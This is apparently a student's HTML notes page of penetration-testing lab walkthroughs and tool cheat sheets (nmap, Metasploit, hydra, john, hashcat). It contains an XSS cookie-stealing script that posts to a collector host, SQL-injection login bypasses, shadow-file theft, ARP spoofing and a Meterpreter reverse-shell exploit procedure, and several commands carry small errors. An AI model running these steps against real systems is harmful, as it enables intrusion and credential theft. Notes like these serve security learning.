@@ -1,0 +1,1219 @@
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>crazyeights225 - Notes</title>
+<link rel="stylesheet" type="text/css" media="screen" href="../assets/bootstrap.css">
+<link rel="stylesheet" href="../public/css/_bootswatch.scss">
+<link rel="stylesheet" href="../public/css/_variables.scss">
+<link href="../public/viper_xs_icon.ico" rel="shortcut icon" type="image/x-icon"/>
+</head>
+<body>
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+<div class="container">
+  <a class="navbar-brand" href="../index.html"><img src="../assets/cards_xxs.png">
+</a>
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+  <div class="collapse navbar-collapse" id="navbarColor02">
+    <ul class="navbar-nav mr-auto">
+      <li class="nav-item">
+        <a class="nav-link" href="../index.html">Home</a>
+      </li>
+      <li class="nav-item active">
+        <a class="nav-link" href="../files.html">Files<span class="sr-only">(current)</span></a>
+      </li>
+      <li class="nav-item">
+        <a class="nav-link" href="../projects.html">Projects</a>
+    </ul>
+  </div>
+</div>
+</nav>
+<main role="main">
+<div class="album py-4"></div>
+<div class="container">
+<div class="row">
+<div class="col-lg-3">
+    <div class="list-group">
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'Contents')" id="defaultOpen">Contents</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L1')">Lab: HTTP and HTTPS</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L2')">Lab: Using iproute</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L3')">Lab: Web Server Mapping</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L4')">Lab: Scanning and OS Fingerprinting</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L5')">Lab: File and Directory Enumeration</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L6')">Lab: Cross Site Scripting Basics</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L7')">Lab: Basic SQL Injection</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L8')">Lab: Brute Force and Password Cracking</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L9')">Lab: ARP Poisoning</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L10')">Lab: Null Sessions</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'L11')">Lab: Metaspoilt and Meterpreter</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'MSXP')">MS08-067 Windows XP</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'speedupmsfconsole')">Speeding up msfconsole search</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'DNSandFierce')">DNS Resolution and Fierce</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'windows')">Using Windows Terminal</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'hashcat')">Using Hashcat</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'nmap')">Using Nmap</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'scanning')">Scanning Tools</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'crackingtools')">Cracking Tools</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'linuxtools')">Linux Tools</button>
+  <button class="list-group-item list-group-item-action" onclick="openSection(event, 'listofctfandvms')">List of CTFs and Recommended VMS</button>
+</div>
+<br>
+</div>
+<div class="col-lg-9" id="Contents">
+  <div class="jumbotron">
+          <h1 class="display-3">Security Notes</h1>
+          <p class="lead">Notes and Old Labs</p>
+          <hr class="my-4">
+          <p>Cybersecurity student, trying to collect and improve knowledge. Covers all basic skills.</p>
+        </div>
+</div>
+<div class="col-lg-9" id="L1">
+<p class="text-info">Security Notes.</p>
+<h2>Lab.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+    <div class="card-header">HTTP and HTTPS</div>
+    <div class="card-body">
+        <ol>
+            <li> Launch Wireshark, click interface tap0 for tunnel inferface </li>
+            <li> launch browser, go to given http url </li>
+            <li> enter the given username, and password</li>
+            <li> right click traffic, click follow http or tcp stream </li>
+            <li> username and password can clearly be seen in request header, eavesdroppers could steal it</li>
+            <li> go to https page, repeat process </li>
+            <li> traffic is encrypted </li>
+          </ol>
+    </div>
+  </div>
+  </div>
+  <div class="col-lg-9" id="L2">
+      <p class="text-info">Security Notes.</p>
+      <h2>Lab.</h2>
+      <div class="card border-light mb-3" style="max-width: 80rem;">
+          <div class="card-header">Using iproute</div>
+          <div class="card-body">
+              <p class="text-primary">Tools used: nmap, iproute</p>
+<ol>
+<li> connect to vpn </li>
+<li> visit the two webservers at the given addresses 192.168.241.12, and 172.16.88.81 </li>
+<li> Use the tool iproute to see the routes to webservers: </li>
+
+<pre>~$ iproute </pre>
+</div>
+<li> You will be unable to connect to the secret server at the third given address: 192.168.222.199, because there is no route to that Ip address.  </li> 
+<li> Use ifconfig to get broadcast address, and netmask</li>
+<lI> Calculate network address: </li>
+<li> broadcast address: 10.175.34.1 </li>
+<li> Netmask: 255.255.255.0 </li>
+<pre>
+11000000.10101000.11011110.110001111
+&
+11111111.11111111.11111111.11111111
+
+192.168.222.0, with a netmask of 24 
+</pre>
+          
+        </div>
+        </div>
+<div class="col-lg-9" id="L3">
+<p class="text-info">Security Notes.</p>
+<h2>Lab.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+    <div class="card-header">Web Server Mapping</div>
+    <div class="card-body">
+        <p class="text-primary">Tools used: Burpsuite, Browser</p>
+        <ol>
+            <li> Site given: 10.100.13.5 </li>
+            <li> Launch new Burpsuite session </li>
+            <li> In new browser: Go to network configure - connection </li>
+            <li> In manual proxy configuration: <br>
+            HTTP Proxy: 127.0.0.1:8080 <br>
+            Check the box that says use this proxy for all protocols <br>
+            Click Apply button </li>
+            <li> In Burpsuite go to Proxy - Options </li>
+            <li> Select 127.0.0.1:8080 </li>
+            <li> Turn listener on</li>
+            <li> Traffic should appear in Target - Sitemap tab </li>
+            <li> Go to Spider turn on </li>
+            <li> / - click spder this host </li>
+            <li> site map will add new paths  </li>
+            <li> path y7gMEMZtin will appear </li>
+            <li> Expand directory - you will see login.php </li>
+            <li> View source and you will see message from developers with login bypass for debugging </li>
+            <li> go to that url : y7gMEMZtin/login.php?DEBUG=policedebug </li>
+            <li> you will now have access to admin area </li>
+            </ol>
+    </div>
+  </div>
+  </div>
+  <div class="col-lg-9" id="L4">
+      <p class="text-info">Security Notes.</p>
+      <h2>Lab.</h2>
+      <div class="card border-light mb-3" style="max-width: 80rem;">
+          <div class="card-header">Scanning and OS Mapping</div>
+          <div class="card-body">
+              <p class="text-primary">Tools used: fping, nmap</p>
+              <ol>
+                  <li> Perform ping scan with fping:</li>
+<div class="main_code">
+<pre>~$ fping -a -g [IPRANGE] 
+<span style="color: #71afe5">
+// a - show all active hosts 
+// g - ping sweep
+</span></pre></div>
+<li> Perform a ping scan with nmap</li>
+<div class="main_code">
+<pre>
+~$ sudo sudo -sn [IPRANGE] 
+<span style="color: #71afe5">
+// Perform a SYN can against the targets, and Identify clients and servers. 
+// Identify version of every daemon listening on the network: </span>
+~$ sudo nmap -sV [IPRANGE]
+<span style="color: #71afe5">// Identify Operating Systems of hosts on the network on the network: </span>
+~$ sudo nmap -O --osscan-limit [IP range] 
+~$ sudo nmap -O --osscan-guess [IP range]
+                  </pre>
+                  </div>
+                  </ol>
+          </div>
+        </div>
+        </div>
+<div class="col-lg-9" id="L5">
+<p class="text-info">Security Notes.</p>
+<h2>Lab.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+    <div class="card-header">File and Directory Enumeration</div>
+    <div class="card-body">
+        <p class="text-primary">Tools used: Dirbuster</p>
+        <ol>
+            <li> Get network address with ifconfig </li>
+            <li> Do a service scan with nmap </li>
+            <div class="main_code">
+            <pre>~$ sudo nmap -sS 10.104.11.0-255 </pre></div>
+            <li> There was 2 hosts with services: <br>
+            10.104.11.96 - has http port 80 <br>
+            10.104.11.198 - has mysql </li>
+            <li> Go to 10.104.11.96 in browser </li>
+            <li> Open dirbuster </li>
+            <li> Enter IP, Port </li>
+            <li> select dictionary attack with list: /ust/share/dirbuster/wordlists/directory-list-2.3-small.txt </li>
+            <li> set file extensions: .php, .old, .bak </li>
+            <li> attack found 2 files: <br>
+            signup.php - had credentials for db <br>
+            config.old </li>
+            <li> use credentials from signup.php to login into mysql on other host: </li>
+            <div class="main_code">
+            <pre>~$ mysql -u awdmgmt -p UChxKQk96VtM07 -h 10.104..11.198 awdmgmt-accounts </pre>
+            </div>
+            <li>Use: show tables, to show all tables, there is table accounts </li> 
+            <li> Use command: SELECT * FROM accounts, to reveal username and password of admin</li>
+            <li> Use them to login to admin account in browser </li>
+            </ol>
+    </div>
+  </div>
+  </div>
+  <div class="col-lg-9" id="L6">
+      <p class="text-info">Security Notes.</p>
+      <h2>Lab.</h2>
+      <div class="card border-light mb-3" style="max-width: 80rem;">
+          <div class="card-header">Cross Site Scripting</div>
+          <div class="card-body">
+              <p class="text-primary">Tools used: Browser</p>
+              <ol>
+<li> Web application at: 192.168.99.10 </li>
+<li> Given account: Username: attacker Password: attacker and get.php - takes all parameters and stores them in jar.php </li>
+<li> First find XSS points using alert. </li>
+<li> search bar and feedback form are injection points </li>
+<li> Steal cookies with JS by creating an image: </li>
+<div class="main_code">
+<pre>
+&lt;script&gt;
+var i=new Image();
+i.src="http://192.168.99.11/get.php?admin="+document.cookie;
+&lt;/script&gt;
+</pre>
+</div>
+<li> go to jar.txt and refresh until admin goes on site, and cookies appear </li>
+<li> Go to Inspect Element - Network -- Cookies and paste  admin cookie </li>
+</ol>
+          </div>
+        </div>
+        </div>
+<div class="col-lg-9" id="L7">
+      <p class="text-info">Security Notes.</p>
+      <h2>Lab.</h2>
+      <div class="card border-light mb-3" style="max-width: 80rem;">
+          <div class="card-header">Basic SQL Injection</div>
+          <div class="card-body">
+              <p class="text-primary">Tools used: SQLMap, Browser</p>
+<ol>
+<li> Explore web application at 10.124.211.96 and find all injection points </li>
+<li> In the awards section the site the path is /newdetails?id=23, with a different id for each award, testing it reveals that this get request is injectible: http://10.124.211.96/newdetails?id=' or 1=1; -- - </li>
+<li> Use sqlmap to retrieve databases: </li>
+<div class="main_code">
+<pre>~$ sqlmap - u [URL] --dbs 
+~$ sqlmap -u http://10.124.211.96/newdetails?id=26 <pre></div>
+<li> Will give 2 databases: awd, information-schema </li>
+<li> awd - contains login information </li>
+<li> Dump information from database awd </li>
+<div class="main_code">
+<pre>~$ sqlmap -u http://10.124.211.96/newdetails?id=26 -D awd --dump </pre></div>
+<li> Login itself is also vulnerable to sql injection</li>
+<li> Type: </li>
+<div class="main_code">
+<pre>
+Username: admin 
+Password: ' or 1=1; -- -</pre>
+</div>
+<li> You will be logged in as admin </li>
+</ol>
+          </div>
+        </div>
+        </div>
+<div class="col-lg-9" id="L8">
+      <p class="text-info">Security Notes.</p>
+      <h2>Lab.</h2>
+      <div class="card border-light mb-3" style="max-width: 80rem;">
+          <div class="card-header">Brute Force and Dictionary Password Cracking</div>
+          <div class="card-body">
+              <p class="text-primary">Tools used: hydra, ssh, scp, unshadow, john the ripper</p>
+<ol> 
+<li> Get network address with ifconfig </li>
+<li> Scan for live hosts: </li>
+<div class="main_code">
+<pre>~$ sudo nmap -sn 192.168.99.0-255 </pre>
+</div>
+<li> Perform a service scan: </li>
+<div class="main_code">
+<pre> ~$ sudo nmap -sS 192.168.99.0-255 </pre>
+</div>
+There is 1 other host running: <br>
+192.168.99.22, running telnet and SSH 
+</li>
+<li> Use hydra to perform dictionary attack to get login credentials: </li>
+<span style="color:#71afe5;">hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/LeakedDatabases/rockyou-10.txt ssh://192.168.99.22 </span>
+<li> Will find a few credentials, use the root one: <br>
+<pre>
+Username: root
+Password: 123abc </pre>
+</li>
+<li> Login to ssh: </li>
+<div class="main_code">
+<pre> ~$ sudo ssh root@192.168.99.22 </pre>
+</div>
+<li> Will then prompt for a password. Enter root password: 123abc </li>
+<li> Open a new window use scp to get user file and password file from machine: </li>
+<div class="main_code">
+<pre>~$ scp root@192.168.99.22:/etc/passwd .
+~$ scp root@192.168.99.22:/etc/shadow . </pre>
+</div>
+<li> Use unshadow to combine the 2 files: </li>
+<div class="main_code">
+<pre>~$ unshadow passwd shadow &gt; outfile </pre></div>
+<li> Crack the file with john the ripper, try to get as many credentials as possible: </li>
+<div class="main_code">
+<pre> ~$ john -wordlist=[FILE] -rules crackme 
+<pre style="color:#71afe5">
+//for FILE use /usr/share/seclists/Passswords/LeakedDatabases/rockyou-10.txt </pre>
+</pre>
+</div>
+</ol>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="L9">
+    <p class="text-info">Security Notes.</p>
+    <h2>Lab.</h2>
+    <div class="card border-light mb-3" style="max-width: 80rem;">
+        <div class="card-header">ARP Poisoning</div>
+        <div class="card-body">
+            <p class="text-primary">Tools used: arpspoof, wireshark, telnet</p>
+<ol>
+<li> ifconfig for network address </li>
+<li> Perform a service scan with nmap to identify client and server <br> <pre class="terminal"> ~$ nmap -sS [IPRANGE] </pre></li>
+<li>  Identify client and server: <br>
+<pre>
+Server: 10.100.13.37 
+Client: 10.100.13.36 
+</pre>
+</li>
+<li> Enable IP forwarding: </li>
+<div class="main_code">
+<pre> ~$ sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward </pre></div>
+<li> Run arp spoof to intercept traffic: </li>
+<div class="main_code">
+<pre> ~$ arpspoof -i [interface] -t [target(server)] -r [host(client)]
+~$ arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36 </pre></div>
+<li> launch wireshark and intercept traffic on tap0 interface </li>
+<li> Find packages, follow TCP stream, credentials, can be seen in header. </li>
+<li> Login in with the credentials in telnet: </li>
+<div class="main_code">
+<pre>~$ telnet -l [username] [ipaddr of server to connect to] </pre></div>
+</ol>
+        </div>
+      </div>
+      </div>
+<div class="col-lg-9" id="L10">
+    <p class="text-info">Security Notes.</p>
+    <h2>Lab.</h2>
+    <div class="card border-light mb-3" style="max-width: 80rem;">
+        <div class="card-header">Null Sessions</div>
+        <div class="card-body">
+            <p class="text-primary">Tools used: enum4linux, samrdump, smbclient, nmap</p>
+<ol>
+<li> Use ifconfig to get network address: 192.168.99.0 </li>
+<li> Use nmap with is os scan to find windows OS </li>
+<li> Use enum4linux to check for Null Session: </li>
+<div class="main_code">
+<pre> ~$ enum4linux -n 192.168.99.162 </pre></div>
+<li>Shows File Server System is active and &lt;20&gt; appears on the list</li>
+<li> Use enum4linux with -a (all) to gather information:</li>
+<div class="main_code">
+<pre>~$ enum4linux -a 192.168.99.162 </pre>
+</div>
+<li> Shows all users, directories, ...</li>
+<li> Access the remote shares and browse the remote machine: </li>
+<div class="main_code">
+<pre> ~$ smbclient -L WORKGROUP -I 192.168.99.162 -N -U "" </pre></div>
+<li> Get Worksharing and see what files are there: </li>
+<div class="main_code">
+<pre> ~$ smbclient \\\\192.168.99.162\\Worksharing -N </pre></div>
+<li>You will then be given a shell, use the ls command to see all files: </li>
+<div class="main_code">
+<pre> smb:\&gt;  ls </pre></div>
+<li> You will see file Congratulations.txt, save the file to your machine: </li>
+<div class="main_code">
+<pre> smb:\&gt; get Congratulations.txt  ./congrats.txt </pre></div>
+<li> Exit the terminal: </li>
+<div class="main_code">
+<pre> smb:\&gt; exit </pre> </div>
+</ol>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="L11">
+<p class="text-info">Security Notes.</p>
+<h2>Lab.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">Metaspoilt and Meterpreter</div>
+<div class="card-body">
+<p class="text-primary">Tools used: nmap, meterpreter, metaspoilt</p>
+<ol>
+<li> ifconfig - get network address 192.168.99.0 </li>
+<li> scan for live hosts, use service scan with versions <br>
+<div class="main_code">
+<pre> ~$ sudo nmap -sV 192.168.99.0-255 </pre></div>
+<li>returns 1 host  192.168.99.12 with Windows XP and Freeftp </li>
+<li> Launch metaspoilt: </li>
+<div class="main_code">
+<pre> ~$ sudo msfconsole </pre>
+</div>
+<li> Find exploit for service freeftp: </li>
+<div class="main_code">
+<pre> msf&gt; grep windows search freeftp </pre>
+</div>
+<li> Select exploit: </li>
+<div class="main_code">
+<pre> msf&gt; use /windows/ftp/freeftpd_pass </pre></div>
+<li> show options: </li>
+<div class="main_code">
+<pre class="terminal"> msf&gt; options </pre>
+</div>
+<li> configure: </li>
+<div class="main_code">
+<pre> msf&gt; set [parameter] [value] </pre>
+</div>
+<li> show payloads: <br>
+<div class="main_code">
+<pre> msf&gt; show payloads </pre>
+</div>
+</li>
+<li> Set payload (Choose meterpreter shell): <br>
+<div class="main_code">
+<pre> msf&gt; set payload [payload path] </pre>
+</div>
+<li> For payload: show options, configure </li>
+<li> Once payload is configurd, start exploitation: </li>
+<div class="main_code">
+<pre class="terminal"> msf&gt; exploit </pre></div>
+<li> You will get a new window with meterpreter shell </li>
+<li> Get root access: </li>
+<div class="main_code">
+<pre> : getsystem </pre> </div>
+<li> Dump the credential hashes: </li>
+<div class="main_code">
+<pre class="terminal">: hashdump [session number] </pre>
+</div>
+<li> Copy and paste the hashes from meterpreter into text file, save as crackme </li>
+<li> Crack with john the ripper: </li>
+<div class="main_code">
+<span style="color:#71afe5"> ~$ john -wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt -rules crackme </pre></div>
+<li>In meterpreter session search for file Congrats.txt </li>
+<div class="main_code">
+<pre>: find . -name Congrats.txt </pre>
+</div>
+<li> Save the file on your machine: </li>
+<div class="main_code">
+<pre> : download [filepath] [destination] </pre> </div>
+</ol>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="hashcat">
+<p class="text-info">Security Notes.</p>
+<h2>Note.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">Using Hashcat</div>
+<div class="card-body">
+<p class="text-info">Usage:</p>
+<pre>
+<span style="color:#71afe5">//Note: --force option is system (graphics card) specific</span>
+hashcat -m [HASH TYPE] -a 0 --force [FILE WITH HASHES] [DICTIONARY_LOCATION]
+
+<span style="color:palegreen">-m</span> - hash type, look up on wiki 
+<span style="color:palegreen" >-a</span> - number of accelerators
+<span style="color:palegreen">-o [FILENAME]</span> - save result to outfile
+<span style="color:#71afe5">//good list is: /usr/share/seclists/Passwords/LeakedDatabases/md5decryptor.uk.txt</span>
+</pre>
+
+<p class="text-info">Usage Example:</pre>
+<h5>The hash file:</h5>
+<img src="../public/images/hash1.png" style="width:80%;">
+<div class="vspace1em"></div>
+<h5>Running hashcat:</h5>
+<img src="../public/images/hash2.png" style="width:80%;">
+<div class="vspace1em"></div>
+<h5>Out Example:</h5>
+<img src="../public/images/hash3.png" style="width:80%;">
+<div class="vspace1em"></div>
+<h5>Finding the hash type:</h5>
+<a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat Website: Example Hashes</a>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="MSXP">
+<p class="text-info">Security Notes.</p>
+<h2>Note.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">The ms08-67 Windows XP Exploit</div>
+<div class="card-body">
+<p class="text-primary">Tools used: nmap, meterpreter, metaspoilt</p>
+<h4 style="color: white">Details</h4>
+<ul>
+<li> Works with XP up to XP SP3 </li>
+<li> Open VAS Warning: Out of Date </li>
+<li>Exploit Name:  Microsoft Server Service Relative Path Stack Corruption</li>
+<li> Module Path: exploit/windows/smb/ms08_067_netapi</li>
+<li> Port: 445/tcp open microsoft ds Microsoft Windows XP microsoft-ds </li>
+</ul>
+<h4 style="color: white">Procedure</h4>
+<ol>
+<li> sudo msfconsole </li>
+<li> use exploit/windows/smb/ms08_067_netapi</li>
+<li> set payload windows/meterpreter/reverse_tcp</li>
+<li> set RHOST &lt;target address&gt; </li>
+<li> set RPORT &lt;445 or other&gt; </li>
+<li> set LHOST &lt;your_ip&gt; </li>
+<li> set LPORT &lt; your_chosen_port&gt; </li>
+<li> exploit</li>
+<li> If sucessful will open meterpreter shell </li>
+</ol>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="DNSandFierce">
+<p class="text-info">Security Notes.</p>
+<h2>Note.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">DNS Resolution and Fierce</div>
+<div class="card-body">
+<p class="text-primary">Tools used: Fierce</p>
+<pre>
+<pre style="color: #71afe5">//use -dns to find dns servers, zone transfers, .... information about a target domain</pre>~$ fierce -dns [domain_name]
+
+<pre style="color:#71afe5">//To find dns servers on internal networks:</pre>~$ fierce --dns-servers 10.0.0.1 --range 10.0.0.0/24
+
+<pre style="color:#71afe5">//or for entire network:</pre>~$ fierce -range 10.0.0.0-255
+
+<pre style="color: #71afe5">//You can try transfer zone, and brute force against a domain.</pre>~$ fierce -dns [DOMAIN] -dnsserver 10.0.0.1
+</pre>
+</pre>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="speedupmsfconsole">
+<p class="text-info">Security Notes.</p>
+<h2>Note.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">Speeding up msfconsole search</div>
+<div class="card-body">
+<p class="text-primary">Tools used: metaspoilt</p>
+<pre>
+<span style="color:#71afe5">//use -dns to find dns servers, zone transfers, .... information 
+about a target domain</span>
+~$ fierce -dns [domain_name]
+
+<span style="color:#71afe5">//To find dns servers on internal networks:</span>
+~$ fierce --dns-servers 10.0.0.1 --range 10.0.0.0/24
+
+<span style="color: #71afe5">//or for entire network:</span>
+~$ fierce -range 10.0.0.0-255
+
+<span style="color: #71afe5">//You can try transfer zone, and brute force against a domain.</span>
+~$ fierce -dns [DOMAIN] -dnsserver 10.0.0.1
+</pre>
+</pre>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="windows">
+<p class="text-info">Security Notes.</p>
+<h2>Note.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">Using Windows Terminal</div>
+<div class="card-body">
+<div class="main_code">
+<pre>
+<pre style="color:#71afe5">
+//cd (change current directory)
+//(To home drive)
+</pre>&gt; cd \
+
+<pre style="color:#71afe5">
+//To change the drive</pre>&gt;cd /D [drive letter]:
+<pre style="color:#71afe5">
+//or to change drive and directory</pre>&gt; cd /[drive letter] [new drive letter]:\[folder]
+
+<pre style="color:#71afe5">
+//ls (show directory contents)</pre>&gt; dir
+
+<pre style="color:#71afe5">//To create a new folder</pre>&gt; mkdir [new folder name]
+
+<pre style="color:#71afe5">//Rename files and folders</pre>&gt; ren [old name] [new name]
+
+<pre style="color:#71afe5">//Copy files:</pre>&gt; copy [old file location\old file name] [new file location\new file name]
+
+<pre style="color:#71afe5">
+//Copy folders
+</pre>&gt; copy /s /i [old folder location] [new folder location]
+
+<pre style="color:#71afe5">
+//Delete files
+</pre>&gt; del [FILE NAME]
+
+<pre style="color:#71afe5">
+//Delete folders
+</pre>&gt; RD [FOLDER NAME]
+
+<pre style="color:#71afe5">
+//Run an application
+</pre>&gt; cd c:\windows\System32\
+&gt; mspaint.exe
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="listofctfandvms">
+<p class="text-info">Security Notes.</p>
+<h2>Note.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">List of CTFs and VMs</div>
+<div class="card-body">
+<p class="text-info">Updated: May 3, 2019</p>
+<h3>hackthebox.eu</h3>
+<h5>Difficulty: Maybe not that difficult, but very detailed</h5>
+<p> Lots of live VMs with a wide range of exploits</p>
+<h3>overthewire.org</h3>
+<h5>Difficulty: Easy, (but gets more difficult)</h5>
+<p>Good for learning linux commands</p>
+<h3>pwnable.kr</h3>
+<h5>Difficulty: Easy to Hard</h5>
+<p>Binary Exploits</p>
+<h3>hackthissite</h3>
+<h5>Difficulty: Easy to Hard</h5>
+<p>Basic web exploits</p>
+<h3>https://ringzer0ctf.com/challenges</h3>
+<h5>Difficulty: Havent tried before</h5>
+<h3>http://ctflearn.com/ </h3>
+<h5>Difficulty: Havent tried before</h5>
+<h3>https://asecuritysite.com/challenges</h3>
+<h5>Difficulty: Havent tried before</h5>
+<p>Cryptography</p>
+<h3>https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/</h3>
+<h5>Difficulty: Havent tried before</h5>
+<h3>Vulnhub</h3>
+<h5>Difficulty: Easy to Hard</h5>
+<p>Vulnerable VMs, most from old ctf challenges</p>
+<h3>Vulnerable VMS</h3>
+<ul>
+<li>Metasploitable</li>
+<li>OWASP Juice Shop, multidae (OWASP top 10 web exploits)</li>
+<li>Wakanda - Old CTF challenge + marvel fan </li>
+<li>BSides CTF : Multiple Flags and Challenges, 6.4 GB, https://www.vulnhub.com/entry/bsidestlv-2018-ctf,250/</li>
+<li>HackinOS - Beginner CTF, https://www.vulnhub.com/entry/hackinos-1,295/</li>
+</ul>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="nmap">
+<p class="text-info">Security Notes.</p>
+<h2>Note.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">Using nmap</div>
+<div class="card-body">
+<p>Some Examples: (Range 192.168.0.0 - 192.168.0.255)</p>
+
+<p class="text-info">Ping Sweep:</p>
+
+<p><strong>nmap</strong> -PS 192.168.0.0-192.168.0.255</p>
+
+<p class="text-info">Stealth Scan: (TCP services)</p>
+
+<p><strong>nmap</strong> -sS 192.168.0.182</p>
+
+<p class="text-info">Service Scan, with versions:</p>
+
+<p><strong>nmap </strong>-sV 192.168.0.182</p>
+
+<p class="text-info">Scan well known/top ports:</p>
+
+<p><strong>nmap</strong> --top-ports 10 192.168.0.182</p>
+
+<p class="text-info">Read from list:</p>
+
+<p><strong>nmap</strong> -iL /tmp/test.txt</p>
+
+<p class="text-info">Version and OS Detection Scanning:</p>
+
+<p><strong>nmap</strong> -v -A 192.168.0.182</p>
+
+<p class="text-info">Find out if host is protected by a firewall</p>
+
+<p><strong>nmap</strong> -sA 192.168.0.182</p>
+
+<p class="text-info">Scan a host when protected by the firewall</p>
+
+<p><strong>nmap</strong> -PN 192.168.0.182</p>
+
+<p class="text-info">Show all packets sent and received:</p>
+
+<p><strong>nmap</strong> --packet-trace 192.168.0.182</p>
+
+<p class="text-info">Show interfaces and routes:</p>
+
+<p><strong>nmap</strong> --iflist</p>
+
+<p class="text-info">Scanning Specific Ports:<br />
+<strong>nmap</strong> -p [port] hostname</p>
+
+<p><strong>nmap</strong> -p T:80 192.168.0.182</p>
+
+<p><strong>nmap</strong> -p U:53 192.168.0.182</p>
+
+<p class="text-info">Combining Options:</p>
+
+<p><strong>nmap</strong> -v -sU -sT -p U:53, 111, 137, T:21-25, 80 192.168.0.182</p>
+
+<p class="text-info">Fast Scanning:</p>
+
+<p><strong>nmap </strong>-T5 192.168.0.0/24</p>
+
+<p class="text-info">How to detect remote OS:</p>
+
+<p><strong>nmap</strong> -v -O --osscan-guess 192.168.0.182</p>
+
+<p class="text-info">Nmap TCP ACK(PA) and TCP SYN (PS) ping</p>
+
+<p>(Firewall blocking ICMP pings)</p>
+
+<p><strong>nmap</strong> -PS 192.168.0.182</p>
+
+<p><strong>nmap </strong>-PA 192.168.0.182</p>
+
+<p class="text-info">Scan using IP Protocol ping&nbsp;</p>
+
+<p><strong>nmap</strong> -PO 192.168.0.182</p>
+
+<p class="text-info">Scan using UDP Ping:</p>
+
+<p><strong>nmap</strong> -PU 192.168.0.182</p>
+
+<p class="text-info">Scan for UDP Services:</p>
+
+<p><strong>nmap</strong> -sU 192.168.0.182</p>
+
+<p class="text-info">Scan firewall for security weaknesses using: -sF, -sN, and -sX</p>
+
+<p>Scan for packet fragments: -f</p>
+
+<p class="text-info">Cloak scan with decoys:</p>
+
+<p><strong>nmap</strong> -n -Ddecoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip</p>
+
+<p><strong>nmap</strong> -n -D192.168.1.5,10.5.1.2,172.1.2.4,3.4.2.1 192.168.1.5</p>
+
+<p class="text-info">Scan for MAC Spoofing:<br />
+Spoof your MAC address</p>
+
+<p><strong>nmap</strong> --spoof-mac MAC-ADDRESS-HERE 192.168.1.1</p>
+
+<p class="text-info">Add other options</p>
+
+<p><strong>nmap</strong> -v -sT -PN --spoof-mac MAC-ADDRESS-HERE 192.168.1.1</p>
+
+<p class="text-info"><em>Use a random MAC address</em></p>
+
+<p><em>The number 0, means nmap chooses a completely random MAC address</em></p>
+
+<p><strong>nmap</strong> -v -sT -PN --spoof-mac 0 192.168.1.1</p>
+
+<p>Source: https://www.cyberciti.biz/security/nmap-command-examples-tutorials/</p>
+
+<p>&nbsp;</p>
+</div>
+</div>
+</div>
+<div class="col-lg-9" id="scanning">
+<p class="text-info">Security Notes.</p>
+<h2>Note.</h2>
+<div class="card border-light mb-3" style="max-width: 80rem;">
+<div class="card-header">Scanning Tools</div>
+<div class="card-body">
+    <h3>ifconfig</h3>
+
+    <p>ifconfig with no arguments displays the status of currently active interfaces</p>
+    
+    <p>Use inet address and ip to determine range of addresses to scan</p>
+    
+    <h3>For Example:</h3>
+    
+    <p>inet: 192.168.0.182, netmask: 255.255.255.0</p>
+    
+    <p>Gives the range: 192.168.0.0-192.168.0.255</p>
+    
+    <h2>Tools for scanning networks and devices:</h2>
+    
+    <h3>ping</h3>
+    
+    <p>Single Device:&nbsp;</p>
+    
+    <p>&nbsp;ping 192.168.0.182</p>
+    
